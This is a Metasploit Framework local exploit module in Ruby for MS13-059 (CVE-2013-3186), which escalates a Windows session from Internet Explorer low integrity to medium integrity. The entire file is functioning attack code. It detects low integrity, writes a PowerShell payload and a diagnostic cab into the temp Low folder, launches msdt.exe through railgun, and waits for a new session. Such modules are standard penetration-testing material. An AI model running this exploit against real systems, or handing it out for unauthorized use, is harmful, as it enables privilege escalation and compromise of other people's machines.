##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::Powershell
	include Msf::Exploit::FileDropper
	include Msf::Post::File
	include Msf::Post::Windows::FileInfo

	def initialize(info={})
		super( update_info( info,
			'Name'		=> 'MS13-059 IE Low to Medium Integrity Privilege Escalation',
			'Description'	=> %q{
				The HKLM\Software\Microsoft\Internet Explorer\Low Rights\Elevation Policy
			lists programs that will run as Medium Integrity when spawned from IE if the policy
			value is set to 3. The MS Diagnostic Tool (MSDT.exe) allows users to specify a 
			package or a cab on the command line to troubleshoot certain issues. This cab file
			basically consists of a number of powershell files which are run to diagnose and
			fix issues found. MSDT is one of the programs set to run as Medium Integrity.

			MSDT requires that files are signed with a valid code signing certificate. This
			module includes a self-signed diagnostic package as a proof of concept. To try
			it install the certificate from DiagPackage.cat to the Trusted Root Certificate
			and Trusted Publisher Certificate Authority stores.

			To generate your own signed cab the easiest tool to use is TSPDesigner from the Windows
			SDK. Alternatively the package files are based on xml, powershell and stored in cab
			files and could be signed by signtool.exe or osslsigncode.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=>
				[
					'Fermin J. Serna', # Discovery
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit module
				],
			'Platform'	=> [ 'win' ],
			'SessionTypes'	=> [ 'meterpreter' ],
			'Targets'	=>
			[
				[ 'Windows x86', { 'Arch' => ARCH_X86 } ],
				[ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
			],
			'DefaultTarget' => 0,
			'DisclosureDate'=> "Nov 27 2012",
			'References' =>
				[
					[ 'CVE', '2013-3186' ],
					[ 'MSB', 'MS13-059' ],
					[ 'OSVDB', '96191'],
					[ 'URL', 'http://zhodiac.hispahack.com/index.php?section=blog&day=21&month=8&year=2013' ]

				]
		))

		register_options(
			[
				OptPath.new('CAB', [false, 'Path to user signed Diagnostic Package Cab']),
				OptBool.new("ExitOnSession", [ true, "Return from the exploit after a session has been created", true ]),
				OptInt.new("ListenerTimeout", [ true, "The maximum number of seconds to wait for new sessions", 120])
			], self.class
		)

	end

  # This could benefit from whoami method in BypassUAC
	def low_integrity_level?
		tmp_dir = expand_path("%USERPROFILE%")
		cd(tmp_dir)
		new_dir = "#{rand_text_alpha(5)}"
		begin
			session.shell_command_token("mkdir #{new_dir}")
		rescue
			return true
		end

		if directory?(new_dir)
			session.shell_command_token("rmdir #{new_dir}")
			return false
		else
			return true
		end
	end

	def exploit
		# First of all check if the session is running on Low Integrity Level.
		print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
		fail_with(Failure::NotVulnerable, "Not running at Low Integrity!") unless low_integrity_level?

		# Hardcoded payload name for proof of concept due to signing issues
		payload_file = "payload.ps1"
		diag_cab = "DiagPkg.diagcab"

		tmp_dir = expand_path("%TEMP%")
    win_dir = expand_path("%WINDIR%")
		tmp_dir << "\\Low" unless tmp_dir[-3,3] =~ /Low/i

		payload_file = "#{tmp_dir}\\#{payload_file}"
		diag_cab = "#{tmp_dir}\\#{diag_cab}"

		ps1 = Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)

		if datastore['CAB']
			dc_local_path = datastore['CAB']
		else
			dc_local_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2013-3186", "cve-2013-3186.diagcab")
		end

		dc = ''
		File.open( dc_local_path, "rb" ) { |f| dc += f.read(f.stat.size) }

		print_status("Trying to drop payload to #{tmp_dir}...")
		if write_file(payload_file, ps1)
			print_good("Payload dropped successfully...")
			register_file_for_cleanup(payload_file)
		else
			fail_with(Failure::Unknown, "Failed to drop payload to File System.")
		end

		print_status("Trying to drop Diagnostic Package to #{tmp_dir}...")
		if write_file(diag_cab, dc)
			print_good("Diagnostic Package dropped successfully...")
			register_file_for_cleanup(diag_cab)
		else
			fail_with(Failure::Unknown, "Failed to drop payload to File System.")
		end

    # N.B. If we use 'runas' instead of 'open' we create a UAC prompt
    # as well as an MSDT prompt and the result High Integrity
    session.railgun.shell32.ShellExecuteA(nil,"open","#{win_dir}\\System32\\msdt.exe","/cab #{diag_cab}","#{tmp_dir}",5)

		print_status("Waiting for user to run the Diagnostic...")
		if not datastore['ExitOnSession'] and not job_id
			fail_with(Failure::Unknown, "Setting ExitOnSession to false requires running as a job (exploit -j)")
		end

		stime = Time.now.to_f
		vprint_status "Starting the payload handler..."
		while(true)
			break if session_created? and datastore['ExitOnSession']
			break if ( datastore['ListenerTimeout'].to_i > 0 and (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f) )

			select(nil,nil,nil,1)
		end
	end
end

